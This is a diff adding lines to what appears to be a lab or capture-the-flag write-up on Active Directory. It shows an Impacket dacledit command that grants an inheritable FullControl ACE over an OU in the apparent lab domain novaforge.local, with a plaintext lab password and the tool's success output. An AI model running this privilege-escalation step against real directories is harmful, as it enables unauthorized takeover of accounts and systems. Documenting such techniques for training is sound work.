@@ -687,5 +687,15 @@ Now as `steve.miller` i have `GenericAll` over the `TIER1-SUPPORT` OU
 > The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit
 
 ```python
+dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'steve.miller' -target-dn 'OU=TIER1-SUPPORT,DC=NOVAFORGE,DC=LOCAL' 'novaforge.local'/'steve.miller':'Password123!'
+Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
+[*] DACL backed up to dacledit-20260807-184447.bak
+[*] DACL modified successfully!
 ```
+
+So now the GenericAll privilege should extend to child nodes
+
+![](Pasted%20image%2020260807184546.png)
+
